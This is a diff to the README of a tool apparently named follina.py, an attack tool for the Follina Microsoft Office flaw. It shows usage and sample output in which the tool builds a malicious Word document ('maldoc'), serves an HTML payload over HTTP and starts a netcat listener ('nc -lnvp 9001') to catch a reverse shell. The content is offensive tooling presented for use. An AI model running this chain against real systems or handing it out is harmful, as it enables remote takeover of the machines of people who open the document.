@@ -34,11 +34,16 @@ To create malicious word document and stage a payload with an http server
 
 
 ```
-$ python3 follina.py   
-[+] copied staging doc /tmp/9mcvbrwo
+$ python3 follina.py -i (network interface) -r (port number for reverse shell)  
+[+] copied staging doc /tmp/g5y17w2c
 [+] created maldoc ./follina.doc
 [+] serving html payload on :8000
+[+] starting 'nc -lnvp 9001
+Listening on 0.0.0.0 9001
+
 ```
+<br> 
+
 
 ![Screenshot from 2022-06-09 01-46-32](https://user-images.githubusercontent.com/74410580/172817080-43919074-fcaf-4af0-b690-ee3cba32d059.png)
 
